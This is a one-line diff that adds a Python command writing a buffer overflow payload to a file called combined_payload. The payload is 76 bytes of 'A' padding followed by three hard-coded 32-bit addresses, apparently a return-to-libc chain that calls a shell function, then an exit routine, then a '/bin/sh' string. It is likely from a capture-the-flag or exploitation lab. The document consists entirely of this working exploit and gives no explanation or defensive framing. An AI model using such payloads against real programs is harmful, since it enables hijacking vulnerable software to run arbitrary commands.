@@ -1,0 +1,1 @@
+python3 -c "import sys; sys.stdout.buffer.write(b'A' * 76 + b'\xe0\x38\xdd\xf7' + b'\xb0\x25\xdc\xf7' + b'\xe8\x0d\xf4\xf7')" > combined_payload
